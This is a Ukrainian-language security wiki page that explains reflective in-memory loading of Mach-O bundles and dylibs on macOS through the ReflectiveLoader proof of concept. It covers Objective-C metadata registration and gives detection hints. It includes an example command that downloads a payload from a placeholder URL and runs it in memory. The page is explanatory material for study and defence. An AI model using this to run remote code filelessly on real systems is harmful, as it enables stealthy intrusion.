# Reflective Mach-O Loading на macOS

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader завантажує образ Mach-O з байтів, уже наявних у власному процесі, потім зв’язує його та запускає його ініціалізатори, не звертаючись до системного завантажувача для відкриття файлу payload. Це **виконання коду в межах процесу**, а не примітив для підвищення привілеїв чи ін’єкції у віддалений процес.<sup>[[2]](#references)</sup>

У нових версіях macOS застарілий шлях `NSCreateObjectFileImageFromMemory`/`NSLinkModule` записує образ на диск. ReflectiveLoader натомість вбудовує старіший код завантаження Apple dyld; Wardle продемонстрував це на macOS 15 і 26.<sup>[[2]](#references)[[3]](#references)</sup>

Якщо завантажувач використовує Hardened Runtime, для непідписаного коду в пам’яті потрібен виняток для виконуваної пам’яті, наприклад `com.apple.security.cs.allow-unsigned-executable-memory` або `com.apple.security.cs.disable-executable-page-protection`; інакше виконання блокується механізмом примусового застосування підписування коду. Це обмеження щодо підпису завантажувача, а не примітив для підвищення привілеїв. Див. [довідник із entitlements macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Для PoC вкажіть URL, що надає raw Mach-O **bundle, framework або dylib**. Його `main.mm` відхиляє порожні завантаження та зазначає, що payload із `LC_DYLD_CHAINED_FIXUPS` не підтримуються. Також можна вказати локальний шлях, але такий варіант не є fileless workflow. Варіант із URL зчитує байти в `NSData` і передає буфер та його довжину до `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Вбудований завантажувач викликає `ImageLoaderMachO::instantiateFromMemory`, а потім `image->link`. Він реєструє метадані Objective-C **після компонування, але до** виклику `image->runInitializers`, який виконує конструктори.<sup>[[5]](#references)</sup> Без реєстрації конструктор, який надсилає повідомлення Objective-C, може завершитися помилкою `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Див. [звичайний процес завантаження образу в dyld](macos-library-injection/macos-dyld-process.md#flow) і [довідник із секцій Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Активація метаданих Objective-C

На відміну від звичайного завантаження dyld, вбудовування старішого завантажувача образів автоматично не робить метадані Objective-C payload придатними для використання `libobjc`.<sup>[[3]](#references)</sup> Адаптований підхід LLVM JIT сканує відображені секції Objective-C у `__DATA` і `__DATA_CONST`, а потім перед запуском конструкторів виконує такі кроки:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Перебрати `__objc_selrefs` із кроком `sizeof(SEL)`. Отримати назву кожного ненульового селектора за допомогою `sel_getName`, передати її до `sel_registerName` і замінити вказівник у секції на канонічний `SEL`.
2. Зібрати класи з `__objc_classlist` і зареєструвати їх за допомогою `objc_readClassPair`, спочатку розв’язавши залежності від суперкласів.
3. Переписати посилання в `__objc_classrefs` і `__objc_superrefs`, щоб вони вказували на зареєстровані класи або метакласи, і приєднати методи категорій із `__objc_catlist`.

Наприклад, виправлення селекторів у `ObjCRuntime.cpp` еквівалентне такому:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC спирається на внутрішню поведінку Objective-C runtime і не підтримує всі можливості формату Mach-O, тому його код реєстрації є прикладом реалізації, а не універсальним завантажувачем, готовим до використання.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Реєстрація потрібна для класів і методів Apple, на які є посилання, а також для класів, визначених у payload.<sup>[[3]](#references)</sup>

У тестах автора reflectively loaded image не з'являється в `dyld_all_image_infos`. Натомість його анонімні виконувані мапінги можуть відображатися у `vmmap` як безіменні ділянки `dylib`; вибіркові stack frames можуть показуватися як `<unknown binary>`. Це підказки для перевірки, а не надійна атрибуція саме цьому завантажувачу; доступ до інформації про task іншого процесу обмежений entitlement-ами. Див. [дамп пам'яті macOS](../macos-files-folders-and-binaries/macos-memory-dumping.md), щоб дізнатися про обмеження доступу до процесів.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C і Swift у macOS: збірка знань](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Відновлення reflectively code loading у macOS (частина I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Відновлення reflectively code loading у macOS (частина II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [Головний файл ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [Файл ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [Файл ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
